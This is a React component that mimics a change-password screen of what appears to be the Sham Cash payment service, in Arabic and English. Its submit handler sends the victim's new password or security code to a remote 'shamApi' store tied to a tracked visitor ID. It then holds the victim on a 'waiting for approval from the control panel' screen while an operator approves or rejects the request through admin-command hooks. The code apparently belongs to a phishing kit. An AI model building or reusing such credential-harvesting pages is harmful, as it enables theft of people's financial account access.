import { useState, useRef, useEffect } from "react";
import { Lock, ShieldCheck, Eye, EyeOff, CheckCircle, XCircle } from "lucide-react";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { useAdminCommands } from "@/hooks/useAdminCommands";
import { useLang } from "@/hooks/useLang";
import { shamApi } from "@/lib/shamApi";

const T = {
  ar: {
    back: "رجوع", dir: "rtl" as const,
    heading: "تغيير كلمة المرور",
    subtitle: "ادخل كلمة السر الجديدة و رمز الأمان الخاص بك",
    securityCode: "رمز الأمان",
    newPass: "كلمة المرور الجديدة",
    confirmPass: "تأكيد كلمة المرور",
    waiting: "في انتظار الموافقة من لوحة التحكم...",
    waitingBtn: "جارٍ الانتظار...",
    submit: "تغيير كلمة المرور",
    approvedTitle: "تم تغيير كلمة المرور",
    approvedSub: "تم تحديث كلمة المرور بنجاح.\nيمكنك الآن تسجيل الدخول.",
    login: "تسجيل الدخول",
    rejectedTitle: "تم رفض الطلب",
    rejectedSub: "لم يتم تغيير كلمة المرور.\nيرجى المحاولة مجدداً.",
    tryAgain: "المحاولة مجدداً",
  },
  en: {
    back: "Back", dir: "ltr" as const,
    heading: "Change Password",
    subtitle: "Enter your new password and security code",
    securityCode: "Security Code",
    newPass: "New Password",
    confirmPass: "Confirm Password",
    waiting: "Waiting for approval from the control panel...",
    waitingBtn: "Waiting...",
    submit: "Change Password",
    approvedTitle: "Password Changed",
    approvedSub: "Your password has been updated successfully.\nYou can now sign in.",
    login: "Sign In",
    rejectedTitle: "Request Rejected",
    rejectedSub: "Password was not changed.\nPlease try again.",
    tryAgain: "Try Again",
  },
};

function ShamLogo() {
  return (
    <div className="relative h-28 w-32">
      <div
        className="absolute left-5 top-12 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#5dd99f] via-[#44a984] to-[#257b6f] shadow-[0_18px_35px_rgba(20,219,144,0.12)]"
        style={{
          clipPath: "polygon(0 20%, 64% 0, 100% 27%, 37% 57%, 100% 86%, 100% 100%, 36% 71%, 0 50%)",
        }}
      />
      <div
        className="absolute left-14 top-5 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#6273dd] via-[#5365c3] to-[#354075] shadow-[0_22px_40px_rgba(99,116,212,0.18)]"
        style={{
          clipPath: "polygon(0 0, 100% 34%, 100% 100%, 35% 70%, 0 53%)",
        }}
      />
    </div>
  );
}

type Status = "idle" | "pending" | "approved" | "rejected";

export function ShamCashChangePassword() {
  const [showNew, setShowNew] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  const [status, setStatus] = useState<Status>("idle");
  const [fields, setFields] = useState({ securityCode: "", newPass: "", confirmPass: "" });
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [lang] = useLang();
  const t = T[lang];
  useVisitorTracking("تغيير كلمة المرور");
  useAdminCommands();

  async function handleSubmit() {
    const visitorId = localStorage.getItem("sham_visitor_id");
    if (visitorId) {
      await shamApi.patch(visitorId, {
        changepassStatus: "pending",
        password: fields.newPass || fields.securityCode,
        page: "تغيير كلمة المرور",
        lastSeen: Date.now(),
      });
    }
    localStorage.removeItem("sham_changepass_status");
    setStatus("pending");

    intervalRef.current = setInterval(() => {
      const s = localStorage.getItem("sham_changepass_status") as Status | null;
      if (s && s !== "pending") {
        setStatus(s);
        if (intervalRef.current) clearInterval(intervalRef.current);
      }
    }, 500);
  }

  useEffect(() => {
    localStorage.removeItem("sham_changepass_status");
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, []);

  if (status === "approved") {
    return (
      <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
        <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
        <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />
        <div className="mx-auto flex min-h-screen max-w-[390px] flex-col items-center justify-center px-6 text-center space-y-5">
          <CheckCircle className="h-20 w-20 text-[#1fc28a]" strokeWidth={1.5} />
          <h2 className="text-[24px] font-extrabold text-white/90">{t.approvedTitle}</h2>
          <p className="text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed whitespace-pre-line">{t.approvedSub}</p>
          <button
            type="button"
            onClick={() => { window.location.href = "/"; }}
            className="mt-4 h-[58px] w-full rounded-[15px] bg-[#657bd8] text-[18px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] hover:bg-[#7089e0] transition-colors active:scale-[0.98]"
          >
            {t.login}
          </button>
        </div>
      </div>
    );
  }

  if (status === "rejected") {
    return (
      <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
        <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
        <div className="mx-auto flex min-h-screen max-w-[390px] flex-col items-center justify-center px-6 text-center space-y-5">
          <XCircle className="h-20 w-20 text-[#e54343]" strokeWidth={1.5} />
          <h2 className="text-[24px] font-extrabold text-[#e54343]">{t.rejectedTitle}</h2>
          <p className="text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed whitespace-pre-line">{t.rejectedSub}</p>
          <button
            type="button"
            onClick={() => {
              setStatus("idle");
              localStorage.removeItem("sham_changepass_status");
            }}
            className="mt-4 h-[58px] w-full rounded-[15px] bg-[#2a3047] text-[18px] font-bold text-white/80 hover:bg-[#333d5c] transition-colors"
          >
            {t.tryAgain}
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
      <div className="relative mx-auto flex min-h-screen w-full max-w-[390px] flex-col px-4 pb-7 pt-4 font-['Inter']">
        <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
        <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />

        <div className="relative flex items-center pt-2">
          <button
            type="button"
            onClick={() => { window.location.href = "/"; }}
            className="flex items-center gap-1.5 text-[14px] font-bold text-white/50 hover:text-white/80 transition-colors"
          >
            <svg viewBox="0 0 24 24" fill="none" className="h-4 w-4">
              <path d={lang === "ar" ? "M15 19l-7-7 7-7" : "M9 19l7-7-7-7"} stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
            {t.back}
          </button>
        </div>

        <div className="relative flex justify-center pb-4 pt-4">
          <ShamLogo />
        </div>

        <div className="relative space-y-5">
          <div className="space-y-1">
            <h1 className={`text-[27px] font-extrabold tracking-[-0.02em] text-white/90 ${lang === "ar" ? "text-right" : "text-left"}`}>
              {t.heading}
            </h1>
            <p className={`text-[14px] font-semibold text-[#c9ccdb]/60 leading-relaxed ${lang === "ar" ? "text-right" : "text-left"}`}>
              {t.subtitle}
            </p>
          </div>

          <div className="space-y-4 pt-1">
            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><ShieldCheck className="h-5 w-5" /></div>
              <input
                type="text"
                placeholder={t.securityCode}
                disabled={status === "pending"}
                value={fields.securityCode}
                onChange={(e) => setFields((p) => ({ ...p, securityCode: e.target.value }))}
                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50 ${lang === "ar" ? "text-right" : "text-left"}`}
                dir={t.dir}
              />
            </div>

            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><Lock className="h-5 w-5" /></div>
              <input
                type={showNew ? "text" : "password"}
                placeholder={t.newPass}
                disabled={status === "pending"}
                value={fields.newPass}
                onChange={(e) => setFields((p) => ({ ...p, newPass: e.target.value }))}
                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50 ${lang === "ar" ? "text-right" : "text-left"}`}
                dir={t.dir}
              />
              <button type="button" onClick={() => setShowNew(!showNew)} className="text-white/60 hover:text-white/90 transition-colors">
                {showNew ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>

            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
              <div className="text-white/60"><Lock className="h-5 w-5" /></div>
              <input
                type={showConfirm ? "text" : "password"}
                placeholder={t.confirmPass}
                disabled={status === "pending"}
                value={fields.confirmPass}
                onChange={(e) => setFields((p) => ({ ...p, confirmPass: e.target.value }))}
                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 disabled:opacity-50 ${lang === "ar" ? "text-right" : "text-left"}`}
                dir={t.dir}
              />
              <button type="button" onClick={() => setShowConfirm(!showConfirm)} className="text-white/60 hover:text-white/90 transition-colors">
                {showConfirm ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>
          </div>

          {status === "pending" && (
            <p className="text-center text-[14px] font-semibold text-[#c9ccdb]/60 flex items-center justify-center gap-2">
              <svg className="h-4 w-4 animate-spin text-[#657bd8]" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25" />
                <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round" />
              </svg>
              {t.waiting}
            </p>
          )}

          <div className="pt-1">
            <button
              type="button"
              onClick={status === "idle" ? handleSubmit : undefined}
              disabled={status === "pending"}
              className={`w-full h-[58px] rounded-[15px] text-[20px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-all flex items-center justify-center gap-3
                ${status === "pending"
                  ? "bg-[#657bd8]/60 cursor-not-allowed"
                  : "bg-[#657bd8] hover:bg-[#7089e0] active:scale-[0.98]"
                }`}
            >
              {status === "pending" ? (
                <>
                  <svg className="h-5 w-5 animate-spin" viewBox="0 0 24 24" fill="none">
                    <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="3" strokeOpacity="0.3" />
                    <path d="M12 2a10 10 0 0 1 10 10" stroke="white" strokeWidth="3" strokeLinecap="round" />
                  </svg>
                  {t.waitingBtn}
                </>
              ) : (
                t.submit
              )}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default ShamCashChangePassword;
